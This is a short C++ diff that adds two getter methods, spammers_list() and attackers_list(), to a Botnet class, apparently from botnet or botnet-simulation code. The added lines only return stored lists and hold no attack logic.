@@ -76,6 +76,18 @@ std::vector< boost::shared_ptr< Bot > > Botnet::repeaters_list()
 }
 
 
+std::vector< boost::shared_ptr< Bot > > Botnet::spammers_list()
+{
+	return spammers;
+}
+
+
+std::vector< boost::shared_ptr< Bot > > Botnet::attackers_list()
+{
+	return attackers;
+}
+
+
 void Botnet::start()
 {
 	server->start();
